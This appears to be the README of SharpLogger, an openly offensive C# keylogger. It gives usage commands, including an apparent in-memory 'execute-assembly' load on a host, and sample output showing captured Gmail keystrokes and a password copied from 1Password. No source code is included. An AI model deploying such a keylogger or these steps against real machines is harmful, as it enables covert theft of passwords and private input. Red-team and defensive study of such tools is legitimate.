# SharpLogger

## Author's Note

I maintain no project, but for one that is more frequently updated (and more stable), I recommend you use WireTap's implementation of this keylogger which can be found here: https://github.com/djhohnstein/WireTap
Also, this is just a fork/variation from the original SharpLogger.

## Description

Simple C# project to log keystrokes to both console and a temp file.

## Usage

`.\Keylogger.exe`

`execute-assembly Keylogger.exe`

## Example Output

```
User    : DOMAIN\USER
Window  : Gmail - Google Chrome
Time    : 2018-12-18 01:01:54 PM
LogFile : C:\Users\USER\AppData\Local\Temp\ffbe0dfd-2d6a-4470-9e4b-0c65eeec5a9c.log
----------------------------------------------

testuser@gmail.com<Enter><Ctrl><Windows Key><Left>

User    : DOMAIN\USER
Window  : 1Password
Time    : 2018-12-18 01:01:59 PM
LogFile : C:\Users\USER\AppData\Local\Temp\ffbe0dfd-2d6a-4470-9e4b-0c65eeec5a9c.log
----------------------------------------------

<Ctrl>
        [cntrl-C] Clipboard Copied: mciDuz72zKmkqiEaLG

        [cntrl-C] Clipboard Copied: mciDuz72zKmkqiEaLG
<Ctrl><Windows Key><Right>
```

## Special Thanks

To PowerSploit and Justin Bui's project, SharpClipboard (https://github.com/justinbui/SharpClipboard)
